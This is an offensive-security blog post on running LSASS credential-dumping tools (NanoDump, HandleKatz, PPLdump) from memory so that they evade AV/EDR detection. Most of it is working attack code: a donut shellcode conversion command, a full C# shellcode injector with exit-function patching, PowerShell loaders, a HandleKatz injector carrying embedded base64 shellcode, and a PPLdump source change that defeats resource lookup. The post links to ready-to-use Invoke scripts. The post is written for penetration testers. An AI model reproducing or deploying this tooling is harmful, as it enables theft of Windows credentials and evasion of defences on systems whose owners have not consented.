---
title: "LSASS dumping in 2021/2022 - from memory - without C2"
layout: "post"
---

This post will explain my trials&fails and road to success for building scripts to dump LSASS from memory. It's nothing new, existing tools, existing techniques. But those techniques for in memory execution may fail in certain situations. Those situations plus potential solutions are shown here. The LSASS dumping tools were all released/published within the last year and are from my point of view state of the art for this time.

<!--more-->

I did not write a blog post for a longer time now. Had too many other projects like <a href="https://www.youtube.com/channel/UC27i77nEwKE8hffrxNqXNOg">Streaming</a> & <a href="https://github.com/S3cur3Th1sSh1t">Scripting</a>. But now, I also had one smaller topic, which might be interesting for some of you. If you ever tried to use a reflective loader to execute PE's from memory and failed for some reason this post might give a solution for some of the problems.

## Introduction

In the last year, several more tools for dumping the LSASS process with the goal of parsing Windows credentials were released. There are already dozens of tools in the public Github world for this purpose. But three of the newer tools are more important in the moment from my point of view, as they solve specific "problems" for us Offsec people. Those three are:

* <a href="https://github.com/itm4n/PPLdump">PPLdump</a>
* <a href="https://github.com/codewhitesec/HandleKatz">Handlekatz</a>
* <a href="https://github.com/helpsystems/nanodump">NanoDump</a> 

<a href="https://github.com/itm4n/PPLdump">PPLdump</a> is the only tool/technique I know that is able of bypassing <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection">LSA Protection</a> without using a custom driver and therefore from Userland. Update: Just two days after writing this sentence, the PPLDump technique was integrated into NanoDump via <a href="https://github.com/helpsystems/nanodump/commit/9f5202462168b109a57accc2781000f9f141887b">new commit</a>.

If you didn't do so already, I highly recommend reading the two blog posts from <a href="https://twitter.com/itm4n">@itm4n</a> - <a href="https://itm4n.github.io/lsass-runasppl/">Do You Really Know About LSA Protection (RunAsPPL)?</a> and <a href="https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland/">Bypassing LSA Protection in Userland</a>.

The alternative to this would be e.g. the usage of Mimikatz with it's driver like that:

<p align="center">
          <img src="/assets/posts/LSASSDump/mimidrv.png">
</p>

In the recent years the detection techniques for LSASS dumps from AV/EDR vendors have continuously improved. Using the `MiniDumpWriteDump`  function - which many older tools use - will most likely get detected via hooking. In addition, opening up a new handle to the lsass.exe process itself is also detected/blocked by many vendors nowadays. Dropping the memory dump of lsass.exe to disk is also an IoC, which is detected/blocked by some vendors. You may have success dumping the process, but the signature of the dump file can be detected, so that the file gets instantly deleted.

<a href="https://github.com/codewhitesec/HandleKatz">Handlekatz</a> and <a href="https://github.com/helpsystems/nanodump">NanoDump</a> bypass theese detection measures, which makes them state of the art from my point of view. Outflank already released a LSASS dumping tool called <a href="https://github.com/outflanknl/Dumpert">Dumpert</a> three years ago, so that's also nothing *new*. But they use syscalls retrieved via <a href="https://github.com/jthuraisamy/SysWhispers2">Syswhispers2</a> which makes them support all Windows versions. And Dumpert supports *only* supports some Windows version in it's released state. Hooking is therefore bypassed via direct syscall usage and/or dynamic invokation of Win32 API's. The memory dump file signature detections can be bypassed via an option to drop the dump with an invalid signature. Otherwise it's possible to retrieve the dump fully from memory - but only via Command & Control (C2) server.

There are plenty more features - just take a look at their README and code to get an overview.
 

## Execution from memory

Why should we even care for in memory execution? Just compiling source code and dropping it on the target system will most likely result in being detected by the local AV/EDR solution. The signature based detection can flag the binary you're dropping and/or it can be forwarded to an Cloud/Sandbox for behaviour based analysis. Executing the binaries from memory will bypass theese detection methods and the "only" thing you have to care about it memory scanners and or behaviour based detections for the process.

Using a Command & Control framework like Cobalt Strike or others, existing modules can be used to execute PE's or Scripts from memory. But not everyone in our industry has access to those tools and or especially penetration testers will not make use of C2's in all of their projects. So I wanted to make those tools usable from memory for everyone via an easy way. My streams also contain one video with an explanation on how to use PE-Loaders and Load C# binaries from Powershell - <a href="https://www.youtube.com/watch?v=oe11Q-3Akuk">Reflective C# Assembly Loading && reflective PE-Injection</a>. But as this blog post will show, it's not *just* working for every Portable Executable.

All three tools are written in C/C++. So if we want to execute them from memory we have three options (if someone knows more, I'm open for DMs with a correction):

1. Using a PE-Loader
2. Convert them to shellcode and execute that
3. Port the functionality/technique to C#/Powershell to easily load them from memory

I like to take the path of shortest resistance and therefore quickwins. So I excluded number three here for myself. This would take too much more time for me. So I stack to the first and the seccond techniques.

## Using a PE-Loader

To stay in memory I prefer to use the tooling in C# or Powershell. My personal preference in terms of PE-Loader for theese languages are the following:
* Powershell - Powersploits <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectivePEInjection</a>
* C# - Nettitudes RunPE <a href="https://github.com/nettitude/RunPE">RunPE</a>

Both have important features for a PE-Loader such as:
1. Exit Function patching &
2. Argument handling

Many other public PE-Loaders don't care for those two features and therefore fail in certain situations. Without Exit function patching the whole process will die after execution (which can involve the hosting binary such as powershell.exe or the C2-implant). No argument handling == no possibility to pass arguments to the reflectively loaded PE.

Using Powershell and Invoke-ReflectivePEInjection I tried the following:

```batch
Import-Module Invoke-ReflectivePEInjection
$pebytes = [io.file]::ReadAllBytes("C:\temp\dumptools\ppldump.exe")
Invoke-ReflectivePEInjection -PEBytes $pebytes -ExeArgs "lsass.exe lsass.dmp"
```

<p align="center">
          <img src="/assets/posts/LSASSDump/PPLDumpFail.PNG">
</p>

In the case of PPLDump the arguments were obviously not accepted. So the argument handling function failed. If the arguments are now accepted but the binary runs fine we have two options from my point of view:
1. Hardcoding the arguments into the source code before compiling
2. Find the problem in the loader and fix it

The first option is definitely the time saving one for a quick win. But has the disadvantage, that you need to build a new Script for each purpose and option of the tool. So if you have for example five options to dump LSASS you can use only one per Script. The output file name for a dump would always stay the same which can be used as IoC from AV/EDR vendors and get flagged. That sucks. So I myself spend several hours over a period of several weeks to troubleshoot this issue and fiddled around with the code trying to fix it but failed. Some of my ideas/approached were:
* Patching the PEB to pass the arguments into the current process before loading the executable reflectively (Command-Line-Spoofing)
* Passing the arguments via argument to the `CreateThread`  or `CreateRemoteThread`  API function
* Some fiddling around with `CommandLinetoArgW`  for the arguments as well as using different formats (Unicode for example)

At some point I gave up with this approach and sticked to hardcoding the arguments. Doing that for PPLDump, however resulted in the following - with debug and verbose arguments set:

<p align="center">
          <img src="/assets/posts/LSASSDump/PPLDumpMapFail.PNG">
</p>

It turned out, that this is a completely different problem. The solution for this can be found later on in this post.

Testing Invoke-ReflectivePEInjection for NanoDump and Handlekatz resulted in the the whole process crashing for me. Later on it turned out that this was (at least for NanoDump) related to an older Windows Build VM. I tried troubleshooting this for one or two hours but decided to try RunPE next. For NanoDump this in the first run returned the following behaviour:

```batch
C:\temp\RunPE-main\RunPE-main\RunPE\bin\Release\RunPE.exe C:\temp\dumptools\nanodump.x64.exe -h

[-] Error running RunPE: System.ArgumentNullException: Der Wert darf nicht NULL sein.
Parametername: destination
   bei System.Runtime.InteropServices.Marshal.CopyToNative(Object source, Int32 startIndex, IntPtr destination, Int32 length)
   bei RunPE.Patchers.PEMapper.MapPEIntoMemory(Byte[] unpacked, PELoader& peLoader, Int64& currentBase) in C:\temp\RunPE-main\RunPE-main\RunPE\Patchers\PEMapper.cs:Zeile 27.
   bei RunPE.Program.Main(String[] args) in C:\temp\RunPE-main\RunPE-main\RunPE\Program.cs:Zeile 55.
```

This was easy to troubleshoot and fix for me. In this case, the `.bss` section for nanodump was empty. So the fix is to only copy a section into memory when it's not empty:

```csharp
Before (PEMapper.cs lines 26-33):

            // Copy Sections
            for (var i = 0; i < _pe.FileHeader.NumberOfSections; i++)
            {
                var y = NativeDeclarations.VirtualAlloc((IntPtr) (currentBase + _pe.ImageSectionHeaders[i].VirtualAddress),
                    _pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
                Marshal.Copy(_pe.RawBytes, (int) _pe.ImageSectionHeaders[i].PointerToRawData, y, (int) _pe.ImageSectionHeaders[i].SizeOfRawData);
            }


After:


            // Copy Sections
            for (var i = 0; i < _pe.FileHeader.NumberOfSections; i++)
            {
                var y = NativeDeclarations.VirtualAlloc((IntPtr) (currentBase + _pe.ImageSectionHeaders[i].VirtualAddress),
                    _pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
                // additional check if memory allocation was successfull
                if (y != IntPtr.Zero)
                { 
                    Marshal.Copy(_pe.RawBytes, (int) _pe.ImageSectionHeaders[i].PointerToRawData, y, (int) _pe.ImageSectionHeaders[i].SizeOfRawData);
                }
            }

```

For both - the HandleKatz loader and Nanodump - this still failed and resulted in a crash of RunPE (The cleanup functions were not executed anymore):

<p align="center">
          <img src="/assets/posts/LSASSDump/RunPECrash.png">
</p>

At this point I did not want to dig deeper into the PELoaders and instead tried the seccond technique via conversion to shellcode.

## Converting the PE to shellcode and execute that

There are multiple public tools to convert PE's into shellcode. Here are three example repositories for this technique:
* <a href="https://github.com/TheWover/donut">Donut</a>
* <a href="https://github.com/hasherezade/pe_to_shellcode">pe_to_shellcode</a>
* <a href="https://github.com/monoxgas/sRDI">sRDI</a>

Donut is also capable of converting .NET Assemblies, DLL's, VBS, JS or XSL script code to shellcode. And - it encrypt's it's payloads and decrypts them on runtime. This combination is really awesome for payloads so we gonna stick to that for now.

Converting a PE to shellcode via donut is as easy as the following:

<u>Windows</u>
```
donut.exe -f nanodump.x64.exe -p "--valid --write C:\windows\temp\nano.dmp" -b 1 -o nano.bin
```

<u>Linux</u>
```
donut.exe nanodump.x64.exe -p "--valid --write C:\windows\temp\nano.dmp" -b 1 -o nano.bin
```

You can pass arguments via the "-p" parameter. The following C# code is capable of loading this shellcode from the file to execute it as thread:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.IO;

namespace ShellcodeInject
{
    public class Program
    {


        // Exitpatcher function stolen from From Nettitudes RunPE -> https://github.com/nettitude/RunPE 

        internal const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll")]
        internal static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpFlOldProtect);

        internal static byte[] PatchFunction(string dllName, string funcName, byte[] patchBytes)
        {

            var moduleHandle = GetModuleHandle(dllName);
            var pFunc = GetProcAddress(moduleHandle, funcName);

            var originalBytes = new byte[patchBytes.Length];
            Marshal.Copy(pFunc, originalBytes, 0, patchBytes.Length);


            var result = VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out var oldProtect);
            if (!result)
            {

                return null;
            }

            Marshal.Copy(patchBytes, 0, pFunc, patchBytes.Length);


            result = VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, oldProtect, out _);
            if (!result)
            {
            }

            return originalBytes;
        }

        private byte[] _terminateProcessOriginalBytes;
        private byte[] _ntTerminateProcessOriginalBytes;
        private byte[] _rtlExitUserProcessOriginalBytes;
        private byte[] _corExitProcessOriginalBytes;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        internal bool PatchExit()
        {


            var hKernelbase = GetModuleHandle("kernelbase");
            var pExitThreadFunc = GetProcAddress(hKernelbase, "ExitThread");

            var exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            /*
                mov rcx, 0x0 #takes first arg
                mov rax, <ExitThread> # 
                push rax
                ret
             */
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);

            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            _terminateProcessOriginalBytes =
                PatchFunction("kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            if (_terminateProcessOriginalBytes == null)
            {
                return false;
            }
            _corExitProcessOriginalBytes =
                PatchFunction("mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            if (_corExitProcessOriginalBytes == null)
            {
                return false;
            }

            _ntTerminateProcessOriginalBytes =
                PatchFunction("ntdll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());
            if (_ntTerminateProcessOriginalBytes == null)
            {
                return false;
            }


            _rtlExitUserProcessOriginalBytes =
                PatchFunction("ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            if (_rtlExitUserProcessOriginalBytes == null)
            {
                return false;
            }

            return true;
        }

        internal void ResetExitFunctions()
        {

            PatchFunction("kernelbase", "TerminateProcess", _terminateProcessOriginalBytes);

            PatchFunction("mscoree", "CorExitProcess", _corExitProcessOriginalBytes);

            PatchFunction("ntdll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);

            PatchFunction("ntdll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);

        }

        private delegate IntPtr GetPebDelegate();


        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


        public static void Inject()
        {

            byte[] buf1 = File.ReadAllBytes(@"nano.bin");
            uint num;
            IntPtr pointer = Marshal.AllocHGlobal(buf1.Length);
            Marshal.Copy(buf1, 0, pointer, buf1.Length);
            VirtualProtect(pointer, new UIntPtr((uint)buf1.Length), (uint)0x40, out num);

            var mc = new Program();

            bool patched = mc.PatchExit();
            Console.WriteLine("\r\nExit functions patched: " + patched + "\r\n\r\n");

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, pointer, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            Console.WriteLine("Thread Complete");

            mc.ResetExitFunctions();


        }

    }
}
```

I leave it as an excercise for the reader here to use syscalls instead of Win32 API's to avoid detections. The Exit function patching is important. If you leave that out, the whole process will always die when the executable exits.

This compiled C# DLL can be loaded from memory by embedding it in a Powershell Script for example like that:

```rb
# $DLLBytes = [Convert]::FromBase64String("TVqQAAMAAAAEAAAA[...snip...]AAAAAA=")
$DLLBytes = [io.file]::ReadAllBytes("InjectShellcode.dll")
[System.Reflection.Assembly]::Load($pebytes)
[ShellcodeInject.Program]::Inject()
```

However, trying this technique also failed for me as the process still died when calling `CreateThread`. Several weeks passed and I did not get one single binary loaded from memory. I therefore asked the awesome community <a href="https://twitter.com/ShitSecure/status/1495117338840113152">in a Tweet</a> for tipps/help. And indeed <a href="https://twitter.com/s4ntiago_p">@s4ntiago_p</a> and <a href="https://twitter.com/NotMedic">@NotMedic</a> mentioned two ways to solve this. Thank you guys!

## Getting things to work

### NanoDump

<a href="https://twitter.com/s4ntiago_p">@s4ntiago_p</a> told me, that he was able to load Nanodump from memory via Donut shellcode. But instead of using the latest release he forked the repo and added additional checks + improved donut in general. This work is awesome. You can find it here - <a href="https://github.com/S4ntiagoP/donut/tree/syscalls">https://github.com/S4ntiagoP/donut/tree/syscalls</a>. This fork also contains Syscall support for AMSI/WDLP patching as well as for several other tasks, which is cool. Just take a look at the changes by yourself:

<p align="center">
          <img src="/assets/posts/LSASSDump/Changes.PNG">
</p>

However, doing exactly the same as mentioned in the PE to shellcode chapter with this fork resulted in a functional non process crashing memory execution. My resulting C# code can be found <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs">here</a> and the Powershell Script to load this compiled C# code was added to the <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-NanoDump.ps1">PowerSharpPack Repo</a>.

This solution still has the disadvantage, that the arguments are hardcoded in the donut shellcode. So for every other dumping technique of NanoDump (MalsecLogon, Snapshot, PPL and so on) you would need to create new shellcode.

<a href="https://twitter.com/NotMedic">@NotMedic</a> however was able to modify Invoke-ReflectivePEInjection, so that it's capable of executing NanoDump from memory. His solution can be found here: <a href="https://github.com/NotMedic/Invoke-Nanodump">https://github.com/NotMedic/Invoke-Nanodump</a>. This script has the big benefit, that you can indeed pass arguments and therefore use any NanoDump technique you want via the same script. I took a look at the changes to the original Invoke-ReflectivePEInjection and it's not that much. The two "main" changes were the following:

<p align="center">
          <img src="/assets/posts/LSASSDump/First.png">
</p>

And yes - this is the burp comparer. :-)

In addition two more DLL's were added for the CommandLine overwriting:

<p align="center">
          <img src="/assets/posts/LSASSDump/PEInjectionChanges2.PNG">
</p>

I faced the issue, that this version still crashes on Windows Builds 10.0.17* but it works for never versions. So there may be additional changes needed to get it working on every version.

### Handlekatz

Getting HandleKatz to work was slightly different to Nanodump, as shellcode for this binary can already be generated via `make all` with this repo. The .text segment of the generated PE file already is fully position independent code (PIC) and can therefore be threated like shellcode. The repo also contains a decription on how to create malware via this technique <a href="https://github.com/codewhitesec/HandleKatz/blob/main/PICYourMalware.pdf">PICYourMalware.pdf</a>.

According to the README we can call this shellcode and pass arguments to it in the following form:

```cpp
DWORD handleKatz(BOOL b_only_recon, char* ptr_output_path, uint32_t pid, char* ptr_buf_output);
```

So instead of just executing the shellcode we need to create an delegate for a function in e.g. C# that passes arguments to the shellcodes entrypoint. I struggled with this for some hours again, because I never used a pointer to a char array in C# before, which was needed as seccond and fourth argument. At some point I was sure, that my solution was correct, but using the delegate still resulted in a crashing binary all the time. So - again - I asked people in the community about help for this problem, and the awesome guys <a href="https://twitter.com/am0nsec">@am0nsec</a> and <a href="https://twitter.com/_EthicalChaos_">@_EthicalChaos_</a> helped me to find the correct solution here:

```csharp
 [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
 public delegate uint HandleDelegate(bool reconOnly, IntPtr path, uint pID, StringBuilder output);
```

It's important to specify the CharSet.Ansi here, as this automagically solves converting input and output values for us. To pass the output path value into the function we need to use for example the following:

```csharp
IntPtr StringPointer = Marshal.AllocHGlobal(0x100);
byte[] ByteArray = Encoding.ASCII.GetBytes(path);
 Marshal.Copy(ByteArray, 0, StringPointer, ByteArray.Length);
```

We cannot do the same for the output value in argument four, as this would also crash. But using a StringBuilder here works perfectly fine:

The full C# code for in memory execution looks like this:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Text;
namespace HandleKatzInject
{
    public class Program
    {
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr hProcess, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        public delegate uint HandleDelegate(bool reconOnly, IntPtr path, uint pID, StringBuilder output);
        public static void Inject(bool recon, string path, uint pID)
        {
            // HandleKatz.bin base64 encoded - https://github.com/codewhitesec/HandleKatz 
            string base64Katz = "V0iJ50iD5PBIg+wg6L8sA[...snip...]AAAAA";
            byte[] buf1 = Convert.FromBase64String(base64Katz);
            uint num;
            IntPtr pointer = Marshal.AllocHGlobal(buf1.Length);
            Marshal.Copy(buf1, 0, pointer, buf1.Length);
            VirtualProtect(pointer, new UIntPtr((uint)buf1.Length), (uint)0x40, out num);
            var func = (HandleDelegate)Marshal.GetDelegateForFunctionPointer(pointer, typeof(HandleDelegate));
            IntPtr StringPointer = Marshal.AllocHGlobal(0x100);
            byte[] ByteArray = Encoding.ASCII.GetBytes(path);
            Marshal.Copy(ByteArray, 0, StringPointer, ByteArray.Length);
            StringBuilder output = new StringBuilder(512);
            uint result = func(recon, StringPointer, pID, output);
            Console.WriteLine(output);
        }
    }
}
```

To execute this from memory we can - as I did with NanoDump load this compiled C# assembly via e.g. Powershell:

* <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-HandleKatz.ps1">https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-HandleKatz.ps1</a>

### PPLDump

I did contact <a href="https://twitter.com/itm4n">@itm4n</a> at this point asking for the potential root cause. And he told me, that the PPLDump DLL is embedded into the `.rsrc` section of the executable and loaded on runtime via `FindResource` with this the following code snippet:

```cpp
    if (hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA))
    {
        dwResourceSize = SizeofResource(NULL, hResource);

        if (hResourceData = LoadResource(NULL, hResource))
        {
            lpData = LockResource(hResourceData);
        }
    }
```

Reading through the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea">Microsoft docs</a> about `FindRecource` and other API's around that I found, that with the `NULL` value as first argument this function searches for the current process binary's `.rsrc` section for the value defined via lpName/lpType - in our case the PPLDump dll. But as our current process binary isn't `PPLDump.exe` anymore but instead `Powershell.exe` for Invoke-ReflectivePEInjection or `RunPE.exe` for the C# loader, the dll was never found in this section. I therefore fiddled around with the first argument and tried to parse the sections of the reflectively loaded PPLDump to pass the pointer of it's `.rsrc` section to `FindResource` - but my approached still all failed.

At some point it was clear for me, that modifications in the reflective loader would take too much time for me. Therefore I decided to just change the PPLDump source code to get this to work. Instead of using `FindResource` I embedded the whole DLL as char array into the source code and just used this array for the DLL. This looked like the following:

```cpp
	/* C:\temp\PPLdump-master\PPLdump-master\x64\Release\PPLdumpDll.dll (25.02.2022 21:19:59)
           StartOffset(h): 00000000, EndeOffset(h): 0001E7FF, Length(h): 0001E800
           Generated via HxD 
         */

	unsigned char rawData[124928] = {
		0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
		0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                [...snip...]
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
	};

	
	lpData = rawData;
	dwResourceSize = 124928;
```

And via that - the problem is solved. I didn't deep further into the argument parsing problem for PPLDump - and <a href="https://twitter.com/NotMedic">@NotMedic</a>'s modified Invoke-ReflectivePEInjection also didn't work here. So I was using the same approach like NanoDump, converted PPLDump to shellcode with hardcoded arguments via donut and build a C# loader for it. Same code base, only the base64 encoded shellcode is different:

* <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PPLDumpInject.cs">https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PPLDumpInject.cs</a>

As this assembly is loadable via Powershell, it's also added to PowerSharpPack:

* <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-PPLDump.ps1">https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-PPLDump.ps1</a>

<p align="center">
          <img src="/assets/posts/LSASSDump/PPLDumpSuccess.PNG">
</p>

My initial plan was to at this point write something like the following: To make this technique even stealthier, you should port PPLDump to syscalls instead of using it like it is with the `MiniDumpWriteDump` function.

But <a href="https://twitter.com/s4ntiago_p">@s4ntiago_p</a> already did that with his integration into NanoDump two days ago. So NanoDump - or it's codebase - is definitely the way to go if my implementation fails or gets detected (which will happen ;-)).

## Conclusion

So why did I even write this blog post?  I'm pretty sure, that many others also attempted to load *some* other cool C/C++ tools from memory via a PE-Loader and faced the same or similar issues. It's many times not *just* about using a loader and it works. I hope, that this post will help some of you to get an alternative idea/approach for solving this excercise.

* Modifying the reflective loader itself can lead to success in some situations - but this may cost you a lot of time depending on the problem.

* Conversion to shellcode and execution of that is another way to solve this. Nothing new, but maybe some of you didn't know this so far.

* Using hardcoded arguments in the PE can solve argument parsing problems - but has some obvious mentioned disadvantages depending on the tool 

Even smaller projects can sometimes consume a lot of time. And I'm so glad about this community and the people answering questions everywhere. This small project would have never succeeded and the blog post wouldn't exist without the support and previous work of all other mentioned people, big credit to you all!

## Links & Resources

* PPLDump <a href="https://github.com/itm4n/PPLdump">https://github.com/itm4n/PPLdump</a>
* HandleKatz <a href="https://github.com/codewhitesec/HandleKatz">https://github.com/codewhitesec/HandleKatz</a>
* nanodump <a href="https://github.com/helpsystems/nanodump">https://github.com/helpsystems/nanodump</a>
* LSA Protection <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection">https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection</a>
* itm4n's first PPLDump blog post <a href="https://itm4n.github.io/lsass-runasppl/">https://itm4n.github.io/lsass-runasppl/</a>
* itm4n's first PPLDump blog post <a href="https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland/">https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland/</a>
* Invoke-ReflectivePEInjection <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a>
* RunPE <a href="https://github.com/nettitude/RunPE">https://github.com/nettitude/RunPE</a>
* donut <a href="https://github.com/TheWover/donut">https://github.com/TheWover/donut</a>
* pe_to_shellcode <a href="https://github.com/hasherezade/pe_to_shellcode">https://github.com/hasherezade/pe_to_shellcode</a>
* sRDI <a href="https://github.com/monoxgas/sRDI">https://github.com/monoxgas/sRDI</a>
* Special donut fork/branch <a href="https://github.com/S4ntiagoP/donut/tree/syscalls">https://github.com/S4ntiagoP/donut/tree/syscalls</a>
* NotMedic's Invoke-Nanodump <a href="https://github.com/NotMedic/Invoke-Nanodump">https://github.com/NotMedic/Invoke-Nanodump</a>
* Syswhispers2 <a href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy/SysWhispers2</a>
* Dumpert <a href="https://github.com/outflanknl/Dumpert">https://github.com/outflanknl/Dumpert</a>
* FindResource Microsoft docs <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea">https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea</a>
